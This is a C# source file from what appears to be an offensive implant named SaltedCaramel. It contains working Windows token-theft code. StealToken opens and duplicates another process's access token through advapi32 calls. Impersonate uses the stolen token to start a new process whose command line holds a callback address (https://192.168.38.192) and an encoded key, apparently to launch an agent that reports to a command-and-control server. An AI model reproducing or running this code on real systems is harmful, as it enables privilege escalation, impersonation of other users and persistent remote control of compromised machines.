using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace SaltedCaramel
{
    class Token
    {
        internal static IntPtr stolenHandle;

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle,
            uint desiredAccess, out IntPtr TokenHandle);


        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            uint ImpersonationLevel,
            TOKEN_TYPE TokenType,
            out IntPtr phNewToken);

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, IntPtr dwLogonFlags,
            string lpApplicationName, string lpCommandLine, IntPtr dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref IntPtr lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        public static bool StealToken(int procId)
        {
            IntPtr tokenHandle = IntPtr.Zero; // Stores the handle for the original process token
            stolenHandle = IntPtr.Zero; // Stores the handle for our duplicated token

            try
            {
                SafeWaitHandle procHandle = new SafeWaitHandle(Process.GetProcessById(procId).Handle, true);
                Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);

                try
                {
                    bool procToken = OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out tokenHandle);

                    if (!procToken) // Check if OpenProcessToken was successful
                        throw new Exception(Marshal.GetLastWin32Error().ToString());

                    Debug.WriteLine("[+] StealToken - OpenProcessToken: " + procToken);


                    try
                    {
                        bool duplicateToken = DuplicateTokenEx(tokenHandle, (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation,
                            TOKEN_TYPE.TokenImpersonation, out stolenHandle);

                        if (!duplicateToken) // Check if DuplicateTokenEx was successful
                            throw new Exception(Marshal.GetLastWin32Error().ToString());

                        Debug.WriteLine("[+] StealToken - DuplicateTokenEx: " + duplicateToken);
                        Debug.WriteLine("[+] StealToken successful, got token with handle: " + stolenHandle);

                        return true;
                    }
                    catch (Exception e) // Catch errors thrown by DuplicateTokenEx
                    {
                        Debug.WriteLine("[!] StealToken - ERROR duplicating token: " + e.Message);
                        return false;
                    }
                }
                catch (Exception e) // Catch errors thrown by OpenProcessToken
                {
                    Debug.WriteLine("[!] StealToken - ERROR creating token handle: " + e.Message);
                    return false;
                }
            }
            catch (Exception e) // Catch errors thrown by Process.GetProcessById
            {
                Debug.WriteLine("[!] StealToken - ERROR creating process handle: " + e.Message);
                return false;
            }

        }

        internal static bool Impersonate(int procId, string file)
        {
            IntPtr tokenHandle = IntPtr.Zero;
            stolenHandle = IntPtr.Zero;

            SafeWaitHandle procHandle = new SafeWaitHandle(Process.GetProcessById(procId).Handle, true);
            Debug.WriteLine("Process handle: true");

            bool procToken = OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out tokenHandle);
            Debug.WriteLine("OpenProcessToken: " + procToken);

            bool duplicateToken = DuplicateTokenEx(tokenHandle, (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation,
                TOKEN_TYPE.TokenImpersonation, out stolenHandle);
            Debug.WriteLine("DuplicateTokenEx: " + duplicateToken);

            PROCESS_INFORMATION newProc = new PROCESS_INFORMATION();
            IntPtr startupInfo = IntPtr.Zero;
            string directory = "C:\\Temp";
            bool createProcess = CreateProcessWithTokenW(stolenHandle, IntPtr.Zero, file, "https://192.168.38.192 igOa0opMZdHj2VxA6qbsjCUltgaHBh+vF7uOG4bDd0Y=", IntPtr.Zero, IntPtr.Zero, directory, ref startupInfo, out newProc);
            Debug.WriteLine("Started process with ID " + newProc.dwProcessId);
            Debug.WriteLine("CreateProcess return code: " + createProcess);
            Debug.WriteLine(Marshal.GetLastWin32Error());

            CloseHandle(tokenHandle);
            procHandle.Close();

            return duplicateToken;
        }
    }
}
